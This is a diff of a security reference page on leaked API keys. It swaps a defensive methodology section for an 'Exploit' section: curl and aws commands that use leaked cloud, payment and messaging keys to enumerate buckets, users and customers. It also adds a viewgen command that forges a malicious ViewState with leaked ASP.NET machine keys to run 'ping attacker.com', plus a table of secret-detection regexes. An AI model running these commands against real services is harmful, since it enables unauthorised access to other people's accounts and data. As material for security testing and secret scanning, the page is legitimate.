@@ -1,108 +1,169 @@
-# API Key and Token Leaks
+# API Key Leaks
 
-> API keys and tokens are forms of authentication commonly used to manage permissions and access to both public and private services. Leaking these sensitive pieces of data can lead to unauthorized access, compromised security, and potential data breaches.
+> API keys are secret tokens used to authenticate requests to APIs. When exposed in source code, configuration files, or public repositories, they can be exploited by attackers to access sensitive services, incur costs, or exfiltrate data.
 
 ## Summary
 
 - [Tools](#tools)
-- [Methodology](#methodology)
-    - [Common Causes of Leaks](#common-causes-of-leaks)
-    - [Validate The API Key](#validate-the-api-key)
-- [Reducing The Attack Surface](#reducing-the-attack-surface)
-- [References](#references)
+- [Exploit](#exploit)
+  - [AWS Access Key](#aws-access-key)
+  - [GitHub Token](#github-token)
+  - [Google API Key](#google-api-key)
+  - [Slack Token](#slack-token)
+  - [Stripe API Key](#stripe-api-key)
+  - [Twilio API Key](#twilio-api-key)
+  - [SendGrid API Key](#sendgrid-api-key)
+  - [MailChimp API Key](#mailchimp-api-key)
+- [Detection Patterns](#detection-patterns)
+- [Machine Keys](#machine-keys)
 
 ## Tools
 
-- [aquasecurity/trivy](https://github.com/aquasecurity/trivy) - General purpose vulnerability and misconfiguration scanner which also searches for API keys/secrets.
-- [blacklanternsecurity/badsecrets](https://github.com/blacklanternsecurity/badsecrets) - A library for detecting known or weak secrets on across many platforms.
-- [irsdl/crapsecrets](https://github.com/irsdl/crapsecrets) - A library for detecting known secrets across many web frameworks.
-- [d0ge/sign-saboteur](https://github.com/d0ge/sign-saboteur) - SignSaboteur is a Burp Suite extension for editing, signing, verifying various signed web tokens.
-- [mazen160/secrets-patterns-db](https://github.com/mazen160/secrets-patterns-db) - Secrets Patterns DB: The largest open-source Database for detecting secrets, API keys, passwords, tokens, and more.
-- [momenbasel/KeyFinder](https://github.com/momenbasel/KeyFinder) - is a tool that let you find keys while surfing the web.
-- [streaak/keyhacks](https://github.com/streaak/keyhacks) - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid.
-- [trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog) - Find credentials all over the place.
-- [projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates) - Use these templates to test an API token against many API service endpoints.
+- [truffleHog](https://github.com/trufflesecurity/trufflehog) - Searches through git repositories for secrets
+- [gitleaks](https://github.com/gitleaks/gitleaks) - SAST tool for detecting secrets in git repos
+- [detect-secrets](https://github.com/Yelp/detect-secrets) - Detecting secrets within a codebase
+- [git-secrets](https://github.com/awslabs/git-secrets) - Prevents committing secrets to git repos
+- [secretscanner](https://github.com/deepfence/SecretScanner) - Find secrets and passwords in container images
 
-    ```powershell
-    nuclei -t token-spray/ -var token=token_list.txt
-    ```
+## Exploit
 
-## Methodology
+### AWS Access Key
 
-- **API Keys**: Unique identifiers used to authenticate requests associated with your project or application.
-- **Tokens**: Security tokens (like OAuth tokens) that grant access to protected resources.
+Pattern: `AKIA[0-9A-Z]{16}`
 
-### Common Causes of Leaks
+```bash
+# Verify the key
+aws sts get-caller-identity --access-key-id AKIAIOSFODNN7EXAMPLE --secret-access-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 
-- **Hardcoding in Source Code**: Developers may unintentionally leave API keys or tokens directly in the source code.
+# List S3 buckets
+aws s3 ls
 
-    ```py
-    # Example of hardcoded API key
-    api_key = "1234567890abcdef"
-    ```
-
-- **Public Repositories**: Accidentally committing sensitive keys and tokens to publicly accessible version control systems like GitHub.
-
-    ```ps1
-    ## Scan a Github Organization
-    docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=trufflesecurity
-    
-    ## Scan a GitHub Repository, its Issues and Pull Requests
-    docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments
-    ```
-
-- **Hardcoding in Docker Images**: API keys and credentials might be hardcoded in Docker images hosted on DockerHub or private registries.
-
-    ```ps1
-    # Scan a Docker image for verified secrets
-    docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets
-    ```
-
-- **Logs and Debug Information**: Keys and tokens might be inadvertently logged or printed during debugging processes.
-
-- **Configuration Files**: Including keys and tokens in publicly accessible configuration files (e.g., .env files, config.json, settings.py, or .aws/credentials.).
-
-### Validate The API Key
-
-If assistance is needed in identifying the service that generated the token, [mazen160/secrets-patterns-db](https://github.com/mazen160/secrets-patterns-db) can be consulted. It is the largest open-source database for detecting secrets, API keys, passwords, tokens, and more. This database contains regex patterns for various secrets.
-
-```yaml
-patterns:
-  - pattern:
-      name: AWS API Gateway
-      regex: '[0-9a-z]+.execute-api.[0-9a-z._-]+.amazonaws.com'
-      confidence: low
-  - pattern:
-      name: AWS API Key
-      regex: AKIA[0-9A-Z]{16}
-      confidence: high
+# List IAM users
+aws iam list-users
 ```
 
-Use [streaak/keyhacks](https://github.com/streaak/keyhacks) or read the documentation of the service to find a quick way to verify the validity of an API key.
+### GitHub Token
 
-- **Example**: Telegram Bot API Token
+Pattern: `ghp_[0-9a-zA-Z]{36}` (Personal Access Token)
 
-    ```ps1
-    curl https://api.telegram.org/bot<TOKEN>/getMe
-    ```
+```bash
+# Check token validity
+curl -H "Authorization: token TOKEN_HERE" https://api.github.com/user
 
-## Reducing The Attack Surface
+# List repositories
+curl -H "Authorization: token TOKEN_HERE" https://api.github.com/user/repos
 
-Check the existence of a private key or AWS credentials before committing your changes in a GitHub repository.
+# List organizations
+curl -H "Authorization: token TOKEN_HERE" https://api.github.com/user/orgs
+```
 
-Add these lines to your `.pre-commit-config.yaml` file.
+### Google API Key
 
-```yml
--   repo: https://github.com/pre-commit/pre-commit-hooks
-    rev: v3.2.0
-    hooks:
-    -   id: detect-aws-credentials
-    -   id: detect-private-key
+Pattern: `AIza[0-9A-Za-z\-_]{35}`
+
+```bash
+# Test key validity
+curl "https://maps.googleapis.com/maps/api/geocode/json?address=1600+Amphitheatre+Parkway&key=YOUR_API_KEY"
+
+# Check enabled APIs
+curl "https://www.googleapis.com/discovery/v1/apis?key=YOUR_API_KEY"
+```
+
+### Slack Token
+
+Pattern: `xox[baprs]-([0-9a-zA-Z]{10,48})`
+
+```bash
+# Test token
+curl -H "Authorization: Bearer xoxb-TOKEN" https://slack.com/api/auth.test
+
+# List channels
+curl -H "Authorization: Bearer xoxb-TOKEN" https://slack.com/api/conversations.list
+```
+
+### Stripe API Key
+
+Pattern: `sk_live_[0-9a-zA-Z]{24}`
+
+```bash
+# Check balance
+curl https://api.stripe.com/v1/balance -u sk_live_KEY:
+
+# List customers
+curl https://api.stripe.com/v1/customers -u sk_live_KEY:
+```
+
+### Twilio API Key
+
+Pattern: `SK[0-9a-fA-F]{32}`
+
+```bash
+# List accounts
+curl -G https://api.twilio.com/2010-04-01/Accounts.json \
+  -u ACCOUNT_SID:AUTH_TOKEN
+```
+
+### SendGrid API Key
+
+Pattern: `SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`
+
+```bash
+# Verify key
+curl -H "Authorization: Bearer SG.KEY_HERE" https://api.sendgrid.com/v3/user/profile
+```
+
+### MailChimp API Key
+
+Pattern: `[0-9a-f]{32}-us[0-9]{1,2}`
+
+```bash
+# Get account info
+curl -u "anystring:KEY_HERE" https://usX.api.mailchimp.com/3.0/
+```
+
+## Detection Patterns
+
+| Service | Regex Pattern |
+|---------|---------------|
+| AWS Access Key ID | `AKIA[0-9A-Z]{16}` |
+| AWS Secret Key | `[0-9a-zA-Z/+]{40}` |
+| GitHub PAT | `ghp_[0-9a-zA-Z]{36}` |
+| GitHub OAuth | `gho_[0-9a-zA-Z]{36}` |
+| Google API Key | `AIza[0-9A-Za-z\-_]{35}` |
+| Slack Bot Token | `xoxb-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{24}` |
+| Stripe Live Key | `sk_live_[0-9a-zA-Z]{24}` |
+| Stripe Test Key | `sk_test_[0-9a-zA-Z]{24}` |
+| Twilio API Key | `SK[0-9a-fA-F]{32}` |
+| SendGrid API Key | `SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}` |
+| MailChimp | `[0-9a-f]{32}-us[0-9]{1,2}` |
+| RSA Private Key | `-----BEGIN RSA PRIVATE KEY-----` |
+| SSH Private Key | `-----BEGIN OPENSSH PRIVATE KEY-----` |
+
+## Machine Keys
+
+ASP.NET Machine Keys can be used to forge authentication cookies, ViewState, and other signed/encrypted data.
+
+See [Files/MachineKeys.txt](Files/MachineKeys.txt) for a list of known/leaked machine keys.
+
+```xml
+<!-- Example vulnerable web.config -->
+<machineKey
+  validationKey="FOUND_VALIDATION_KEY"
+  decryptionKey="FOUND_DECRYPTION_KEY"
+  validation="SHA1"
+  decryption="AES"
+/>
+```
+
+Use [Machina](https://github.com/0xacb/viewgen) or `ysoserial.net` to exploit leaked machine keys:
+
+```bash
+# Generate malicious ViewState with leaked machine key
+python3 viewgen.py --webconfig web.config -m UAT -c "ping attacker.com"
 ```
 
 ## References
 
-- [Finding Hidden API Keys & How to Use Them - Sumit Jain - August 24, 2019](https://web.archive.org/web/20191012175520/https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
-- [Introducing SignSaboteur: Forge Signed Web Tokens with Ease - Zakhar Fedotkin - May 22, 2024](https://web.archive.org/web/20240522172244/https://portswigger.net/research/introducing-signsaboteur-forge-signed-web-tokens-with-ease)
-- [Private API Key Leakage Due to Lack of Access Control - yox - August 8, 2018](https://web.archive.org/web/20211208043535/https://hackerone.com/reports/376060)
-- [Saying Goodbye to My Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020](https://web.archive.org/web/20250714230057/https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/)
+- [KeyHacks - streaak](https://github.com/streaak/keyhacks)
+- [API Key Checker - daffainfo](https://github.com/daffainfo/all-about-apikey)
+- [Exposed AWS Keys - Truffle Security](https://trufflesecurity.com/blog/exposed-aws-keys)
